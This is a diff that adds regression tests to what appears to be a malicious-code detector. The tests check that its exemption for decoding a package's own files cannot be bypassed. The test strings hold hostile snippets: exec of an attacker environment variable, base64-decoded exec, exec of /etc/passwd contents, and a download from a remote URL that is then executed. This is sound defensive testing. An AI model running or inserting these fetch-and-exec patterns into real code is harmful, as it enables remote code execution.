@@ -318,3 +318,71 @@ def test_the_anchor_is_not_counted_twice():
                       prelude="here = os.path.dirname(__file__)\n"),
         relpath="mod.py",
     )
+
+
+# --------------------------------------------------------------------------------------
+# TT5 follow-up (df4d7b1 regression, C-135 adversarial verification of the fix's own
+# non-obviousness): _external_tainted_names propagating through with/for bindings made
+# TT5_CMD_INJECTION newly fire on the exact artifact-relative with-block idiom above,
+# since open()/.read() unconditionally count as an external taint source for TT5's
+# general case. The fix exempts ONLY when every tainted name reaching the sink is
+# explained by a decode-shaped, provably artifact-relative read -- these pin that the
+# exemption cannot be defeated by taint riding in through a different channel.
+# --------------------------------------------------------------------------------------
+
+def test_artifact_read_mixed_with_a_second_tainted_source_still_convicts():
+    """String concatenation: the decode-wrapped artifact read is genuinely benign, but
+    an attacker-controlled value concatenated onto it is not — the combined tainted
+    name must still convict."""
+    src = (
+        'import os\n'
+        'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
+        '    payload = fh.read().decode("utf-8") + os.getenv("ATTACKER_PAYLOAD")\n'
+        '    exec(payload, {})\n'
+    )
+    assert _convicts(src, relpath="mod.py")
+
+
+def test_artifact_read_alongside_a_separately_tainted_argument_still_convicts():
+    """The exec/eval call's OTHER argument (not args[0]) carries independent taint —
+    the exemption must not blanket-clear every arg just because one of them resolved to
+    a safe artifact-relative read."""
+    src = (
+        'import os\n'
+        'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
+        '    g = {"x": os.getenv("ATTACKER")}\n'
+        '    exec(fh.read().decode("utf-8"), g)\n'
+    )
+    assert _convicts(src, relpath="mod.py")
+
+
+def test_a_real_decode_primitive_disguised_as_an_artifact_read_still_convicts():
+    """base64.b64decode layered on top of the artifact read is a genuine content-hiding
+    primitive — _decode_signal_is_only_artifact_relative_reads already refuses this
+    shape; confirms TT5's own exemption inherits that refusal rather than re-deciding
+    it more loosely."""
+    src = (
+        'import os, base64\n'
+        'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
+        '    exec(base64.b64decode(fh.read()).decode("utf-8"), {})\n'
+    )
+    assert _convicts(src, relpath="mod.py")
+
+
+def test_a_genuinely_external_file_read_still_convicts():
+    """Not artifact-relative at all (an absolute, unrelated system path) — the
+    exemption must never fire just because the shape LOOKS like the setup.py idiom."""
+    src = 'with open("/etc/passwd", "rb") as fh:\n    exec(fh.read().decode("utf-8"), {})\n'
+    assert _convicts(src, relpath="mod.py")
+
+
+def test_a_network_response_exec_is_unaffected_by_the_exemption():
+    """Sanity check that the exemption is scoped to decode-shaped file reads only — an
+    entirely different taint source (a network response) must convict exactly as
+    before, unaffected by this fix."""
+    src = (
+        'import requests\n'
+        'r = requests.get("http://example.com/payload")\n'
+        'exec(r.text, {})\n'
+    )
+    assert _convicts(src, relpath="mod.py")
